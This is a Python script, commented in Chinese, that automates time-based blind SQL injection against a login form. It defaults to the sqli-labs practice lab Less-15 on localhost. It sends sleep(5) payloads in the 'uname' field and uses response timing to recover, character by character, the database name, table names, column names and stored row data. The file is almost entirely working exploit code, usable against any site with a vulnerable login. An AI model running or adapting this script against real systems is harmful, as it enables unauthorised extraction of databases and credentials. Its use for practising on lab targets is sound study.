#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
from optparse import OptionParser
import time
import threading


# 存放数据库名变量
DBName = ""
# 存放数据库表变量
DBTables = []
# 存放数据库字段变量
DBColumns = []
# 存放数据字典变量,键为字段名，值为字段数据列表
DBData = {}

# 设置重连次数以及将连接改为短连接
# 防止因为HTTP连接数过多导致的 Max retries exceeded with url
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False

# 获取数据库名函数
def GetDBName(url):
	# 引用全局变量DBName,用来存放网页当前使用的数据库名
	global DBName
	print("[-]开始获取数据库名长度")
	# 保存数据库名长度变量
	DBNameLen = 0
	# 用for循环来遍历请求，得到数据库名长度
	for DBNameLen in range(1, 99):
		# 开始时间
		timeStart = time.time()
		payload = "admin' and if(length(database())="+str(DBNameLen)+",sleep(5),0) #"
		# "admin' and if(length(database())=8,sleep(5),0) #"
		data = {
			'uname':payload,
			'passwd':'admin',
			'submit':'Submit',
		}
		res = conn.post(url,data=data)
		# 结束时间
		timeEnd = time.time()
		# 判断时间差
		if timeEnd - timeStart >= 5:
			print("[+]数据库名长度:" + str(DBNameLen))
			break
	print("[-]开始获取数据库名")
	# a表示substr()函数的截取起始位置
	for a in range(1, DBNameLen+1):
		# b表示33~127位ASCII中可显示字符
		for b in range(33, 128):
			timeStart = time.time()
			payload = "admin' and if(ascii(substr(database(),"+str(a)+",1))="+str(b)+",sleep(5),0)#"
			data = {
				'uname':payload,
				'passwd':'admin',
				'submit':'Submit',
			}
			res = conn.post(url,data)
			timeEnd = time.time()
			if timeEnd - timeStart >= 5:
				DBName += chr(b)
				print("[-]"+ DBName)
				break


#获取数据库表函数
def GetDBTables(url, dbname):
	global DBTables
	#存放数据库表数量的变量
	DBTableCount = 0
	print("[-]开始获取{0}数据库表数量:".format(dbname))
	#开始遍历获取数据库表的数量
	for DBTableCount in range(1, 99):
		timeStart = time.time()
		payload = "admin' and if((select count(table_name) from information_schema.tables where table_schema='"+dbname+"' )="+str(DBTableCount)+",sleep(5),0) #"
		data = {
			'uname':payload,
			'passwd':'admin',
			'submit':'Submit',
		}
		res = conn.post(url,data=data)
		timeEnd = time.time()
		if timeEnd - timeStart >= 5:
			print("[+]{0}数据库的表数量为:{1}".format(dbname, DBTableCount))
			break
	print("[-]开始获取{0}数据库的表".format(dbname))
	# 遍历表名时临时存放表名长度变量
	tableLen = 0
	# a表示当前正在获取表的索引
	for a in range(0,DBTableCount):
		print("[-]正在获取第{0}个表名".format(a+1))
		# 先获取当前表名的长度
		for tableLen in range(1, 99):
			payload = "admin' and if((select length(table_name) from information_schema.tables where table_schema='"+dbname+"' limit "+str(a)+",1)="+str(tableLen)+",sleep(5),0) #"
			timeStart = time.time()
			data = {
				'uname':payload,
				'passwd':'admin',
				'submit':'Submit',
			}
			res = conn.post(url,data=data)
			timeEnd = time.time()
			if timeEnd - timeStart >= 5:
				break
		# 开始获取表名
		# 临时存放当前表名的变量
		table = ""
		# b表示当前表名猜解的位置
		for b in range(1, tableLen+1):
			# c表示33~127位ASCII中可显示字符
			for c in range(33, 128):
				timeStart = time.time()
				payload = "admin' and if(ascii(substr((select table_name from information_schema.tables where table_schema='"+dbname+"' limit "+str(a)+",1),"+str(b)+",1))="+str(c)+",sleep(5),0)#"
				data = {
					'uname':payload,
					'passwd':'admin',
					'submit':'Submit',
				}
				res = conn.post(url,data=data)
				timeEnd = time.time()
				if timeEnd - timeStart >= 5:
					table += chr(c)
					print(table)
					break
		#把获取到的名加入到DBTables
		DBTables.append(table)
		#清空table，用来继续获取下一个表名
		table = ""


# 获取数据库表的字段函数
def GetDBColumns(url, dbname, dbtable):
	global DBColumns
	# 存放字段数量的变量
	DBColumnCount = 0
	print("[-]开始获取{0}数据表的字段数:".format(dbtable))
	for DBColumnCount in range(99):
		payload = "admin' and if((select count(column_name) from information_schema.columns where table_schema='"+dbname+"' and table_name='"+dbtable+"')="+str(DBColumnCount)+",sleep(5),0) #"
		data = {
				'uname':payload,
				'passwd':'admin',
				'submit':'Submit',
			}
		timeStart = time.time()
		res = conn.post(url,data=data)
		timeEnd = time.time()
		if timeEnd - timeStart >= 5:
			print("[-]{0}数据表的字段数为:{1}".format(dbtable, DBColumnCount))
			break
	# 开始获取字段的名称
	# 保存字段名的临时变量
	column = ""
	# a表示当前获取字段的索引
	for a in range(0, DBColumnCount):
		print("[-]正在获取第{0}个字段名".format(a+1))
		# 先获取字段的长度
		for columnLen in range(99):
			payload = "admin' and if((select length(column_name) from information_schema.columns where table_schema='"+dbname+"' and table_name='"+dbtable+"' limit "+str(a)+",1)="+str(columnLen)+",sleep(5),0) #"
			data = {
				'uname':payload,
				'passwd':'admin',
				'submit':'Submit',
			}
			timeStart = time.time()
			res = conn.post(url,data=data)
			timeEnd = time.time()
			if timeEnd - timeStart >= 5:
				break
		# b表示当前字段名猜解的位置
		for b in range(1, columnLen+1):
			# c表示33~127位ASCII中可显示字符
			for c in range(33, 128):
				timeStart = time.time()
				payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema='"+dbname+"' and table_name='"+dbtable+"' limit "+str(a)+",1),"+str(b)+",1))="+str(c)+",sleep(5),0) #"
				data = {
					'uname':payload,
					'passwd':'admin',
					'submit':'Submit',
				}
				res = conn.post(url,data=data)
				timeEnd = time.time()
				if timeEnd - timeStart >= 5:
					column += chr(c)
					print(column)
					break
		# 把获取到的名加入到DBColumns
		DBColumns.append(column)
		#清空column，用来继续获取下一个字段名
		column = ""


# 获取表数据函数
def GetDBData(url, dbtable, dbcolumn):
	global DBData
	# 先获取字段数据数量
	DBDataCount = 0
	print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable, dbcolumn))
	for DBDataCount in range(99):
		payload = "admin' and if((select count("+dbcolumn+") from "+dbtable+")="+str(DBDataCount)+",sleep(5),0) #"
		data = {
			'uname':payload,
			'passwd':'admin',
			'submit':'Submit',
		}
		timeStart = time.time()
		res = conn.post(url,data=data)
		timeEnd = time.time()
		if timeEnd - timeStart >= 5:
			print("[-]{0}表{1}字段的数据数量为:{2}".format(dbtable, dbcolumn, DBDataCount))
			break
	for a in range(0, DBDataCount):
		print("[-]正在获取{0}的第{1}个数据".format(dbcolumn, a+1))
		#先获取这个数据的长度
		dataLen = 0
		for dataLen in range(99):
			payload = "admin'and  if((select length("+dbcolumn+") from "+dbtable+" limit "+str(a)+",1)="+str(dataLen)+",sleep(5),0) #"
			data = {
				'uname':payload,
				'passwd':'admin',
				'submit':'Submit',
			}
			timeStart = time.time()
			res = conn.post(url,data=data)
			timeEnd = time.time()
			if timeEnd - timeStart >= 5:
				print("[-]第{0}个数据长度为:{1}".format(a+1, dataLen))
				break
		#临时存放数据内容变量
		data1 = ""
		#开始获取数据的具体内容
		#b表示当前数据内容猜解的位置
		for b in range(1, dataLen+1):
			for c in range(33, 128):
				payload = "admin' and  if(ascii(substr((select "+dbcolumn+" from "+dbtable+" limit "+str(a)+",1),"+str(b)+",1))="+str(c)+",sleep(5),0) #"
				data = {
					'uname':payload,
					'passwd':'admin',
					'submit':'Submit',
				}
				timeStart = time.time()
				res = conn.get(url,data=data)
				timeEnd = time.time()
				if timeEnd - timeStart >= 5:
					data1 += chr(c)
					print(data1)
					break
		#放到以字段名为键，值为列表的字典中存放
		DBData.setdefault(dbcolumn,[]).append(data1)
		print(DBData)
		#把data清空来，继续获取下一个数据
		data1 = ""

# 盲注主函数
def StartSqli(url):
	GetDBName(url)
	print("[+]当前数据库名:{0}".format(DBName))
	GetDBTables(url,DBName)
	print("[+]数据库{0}的表如下:".format(DBName))
	for item in range(len(DBTables)):
		print("(" + str(item + 1) + ")" + DBTables[item])
	tableIndex = int(input("[*]请输入要查看表的序号:")) - 1
	GetDBColumns(url,DBName,DBTables[tableIndex])
	while True:
		print("[+]数据表{0}的字段如下:".format(DBTables[tableIndex]))
		for item in range(len(DBColumns)):
			print("(" + str(item + 1) + ")" + DBColumns[item])
		columnIndex = int(input("[*]请输入要查看字段的序号(输入0退出):"))-1
		if(columnIndex == -1):
			break
		else:
			GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])

if __name__ == '__main__':
	try:
		usage = "./BlindTime_get.py -u url"
		parser = OptionParser(usage)
		# 目标URL参数-u
		parser.add_option('-u', '--url', dest='url',default='http://localhost/Less-15/', type='string',help='target URL')
		options, args = parser.parse_args()
		url = options.url
		threadSQL = threading.Thread(target=StartSqli,args=(url,))
		threadSQL.start()
	except KeyboardInterrupt:
		print("Interrupted by keyboard inputting!!!")
